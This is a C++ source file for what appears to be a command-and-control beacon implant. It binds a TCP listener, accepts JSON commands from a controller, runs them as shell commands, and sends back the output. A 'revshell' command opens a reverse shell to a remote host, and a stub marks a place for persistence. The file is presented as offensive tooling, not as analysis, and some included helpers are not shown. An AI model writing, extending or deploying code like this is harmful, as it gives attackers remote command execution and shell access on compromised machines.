#include <iostream>
#include <string>
#include <tuple>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <unistd.h>
#include <array>
#include <cmdline.hpp>
#include <nlohmann/json.hpp>
#include <include/beacon.hpp>
#include <beacon.vars>

using json = nlohmann::json;

Cmdline cmdline("","");

Beacon::Beacon(int bid, int bport, const char *b_attached_to, const char *serv_ip_addr)
{
    id = bid;
    port = bport;
    attached_to = b_attached_to;
    serv_ip = serv_ip_addr;
}

int stop_accept = 0;

void Beacon::await_update()
{
    int beacon_fd, new_socket, valread;
    struct sockaddr_in address;
    int opt = 1;
    int addrlen = sizeof(address);
    if ((beacon_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
    {
        return;
    }

    if (setsockopt(beacon_fd, SOL_SOCKET,
                   SO_REUSEADDR | SO_REUSEPORT, &opt,
                   sizeof(opt)))
    {
        return;
    }
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = inet_addr(attached_to);
    address.sin_port = htons(port);

    if (bind(beacon_fd, (struct sockaddr *)&address,
             sizeof(address)) < 0)
    {
        return;
    }

    if (listen(beacon_fd, 3) < 0)
    {
        return;
    }

    std::string resp;
    while (true){
        char buf[1024];
        if (stop_accept == 1){
            int connect_err = revshell(rport);
            stop_accept = 0;
            continue;
        }
        if ((new_socket = accept(beacon_fd, (struct sockaddr *)&address,
                                (socklen_t *)&addrlen)) < 0)
        {
            continue;
        }
        valread = read(new_socket, buf, 1024);
        std::string b = std::string{buf}.substr(0,valread);
        sleep(1);
        if (valread != 0){
            resp = respond(b);
            if (stop_accept == 1){
                close(new_socket);
                continue;
            }
            send(new_socket, resp.c_str(), strlen(resp.c_str()), 0);
        }
        close(new_socket);
        buf[0] = 0;
    }
}

std::string Beacon::respond(std::string buf){
    int status = 100;
    std::string cout;
    bool alive = true;
    bool persistent = establish();
    json update;
    try {
        update = json::parse(buf);
    }
    catch (...){
        cout = "error parsing json for " + buf;
        status = 300;
    }
    /// COMMAND LINE EXECUTION GOES HERE ///
    std::string cmd = update["cmd"];

    cmdline.accept(cmd, false);
    int result = cmdline.get_exit_code();
    switch(result){
        case 99:
            stop_accept = 1;
            break;
        case -1:
            cout = ::exec(cmd.c_str());
            break;
    }
    if (stop_accept == 1){
        return "";
    } 
    ////////////////////////////////////////
    return set_update(status, cout, alive, persistent);
}

bool Beacon::establish(){
    return false;
}

const char *Beacon::get_ip(){
    return attached_to;
}

std::string Beacon::set_update(int status, std::string cout, bool alive, bool persistent){
    json j;
    std::string k;
    j["id"] = id;
    j["status"] = status;
    j["cout"] = cout;
    j["alive"] = alive;
    j["persistent"] = persistent;
    std::stringstream ss;
    ss << j;
    k = ss.str();
    return k;
}

Beacon beacon(beacon_id, beacon_port, beacon_ip_addr, serv_ip_addr);

int main()
{
    cmdline.setcmd("revshell","","",rs);
    beacon.await_update();
}
